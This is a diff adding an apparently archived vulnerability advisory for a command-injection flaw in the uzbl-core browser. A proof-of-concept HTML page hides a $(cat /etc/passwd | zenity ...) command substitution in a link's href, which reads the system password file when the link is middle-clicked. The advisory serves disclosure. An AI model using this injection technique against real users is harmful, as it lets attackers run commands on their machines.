@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/42297/info
+
+uzbl 'uzbl-core' is prone to a vulnerability that lets attackers inject arbitrary commands because the application fails to adequately sanitize user-supplied input. This issue stems from an insecure default configuration setting.
+
+To exploit this issue, attackers must entice an unsuspecting user to click on a specially crafted URI with their middle mouse button.
+
+Exploiting this issue would permit remote attackers to inject and execute commands with the privileges of a user running the application. 
+
+<html xmlns="http://www.w3.org/1999/xhtml"> <head> <title>Test</title> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head> <body> <p><a href=""$(cat /etc/passwd |zenity --text-info)"">click me with middle button</a><br />this will open a zenity dialog with your passwd file. I shouldn't be able to do this.</p> </body> </html> 
